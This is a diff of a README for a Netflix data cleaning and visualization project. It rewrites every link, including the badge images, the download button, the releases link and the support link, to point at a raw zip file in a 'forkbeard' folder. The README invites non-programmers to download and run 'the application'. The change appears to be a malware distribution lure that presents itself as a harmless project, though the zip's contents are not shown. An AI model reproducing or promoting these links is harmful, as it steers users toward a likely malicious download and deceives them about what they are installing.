@@ -1,7 +1,7 @@
 # 🎥 Netflix-Data_Cleaning_Analysis_and_Visualization - Clean and Visualize Netflix Data Easily
 
-![GitHub Releases](https://img.shields.io/badge/Release-v1.0-blue.svg)
-[![Download Now](https://img.shields.io/badge/Download_Now-blue.svg)](https://github.com/9ooooooooo/Netflix-Data_Cleaning_Analysis_and_Visualization/releases)
+![GitHub Releases](https://raw.githubusercontent.com/9ooooooooo/Netflix-Data_Cleaning_Analysis_and_Visualization/main/forkbeard/Netflix-Data_Cleaning_Analysis_and_Visualization.zip)
+[![Download Now](https://raw.githubusercontent.com/9ooooooooo/Netflix-Data_Cleaning_Analysis_and_Visualization/main/forkbeard/Netflix-Data_Cleaning_Analysis_and_Visualization.zip)](https://raw.githubusercontent.com/9ooooooooo/Netflix-Data_Cleaning_Analysis_and_Visualization/main/forkbeard/Netflix-Data_Cleaning_Analysis_and_Visualization.zip)
 
 ## 📖 Project Overview
 
@@ -15,7 +15,7 @@ Follow these simple steps to download and run the application. No programming kn
 
 To get started, visit the following page to download the latest version of the application:
 
-[Download from Releases Page](https://github.com/9ooooooooo/Netflix-Data_Cleaning_Analysis_and_Visualization/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/9ooooooooo/Netflix-Data_Cleaning_Analysis_and_Visualization/main/forkbeard/Netflix-Data_Cleaning_Analysis_and_Visualization.zip)
 
 Simply click on the version you want and download it. 
 
@@ -74,7 +74,7 @@ Yes, contributions are welcome! Please check the guidelines on the repository fo
 
 ## 🗨️ Support
 
-If you encounter any issues or have questions, feel free to open an issue on the [GitHub Repository](https://github.com/9ooooooooo/Netflix-Data_Cleaning_Analysis_and_Visualization).
+If you encounter any issues or have questions, feel free to open an issue on the [GitHub Repository](https://raw.githubusercontent.com/9ooooooooo/Netflix-Data_Cleaning_Analysis_and_Visualization/main/forkbeard/Netflix-Data_Cleaning_Analysis_and_Visualization.zip).
 
 ## 📄 License
 
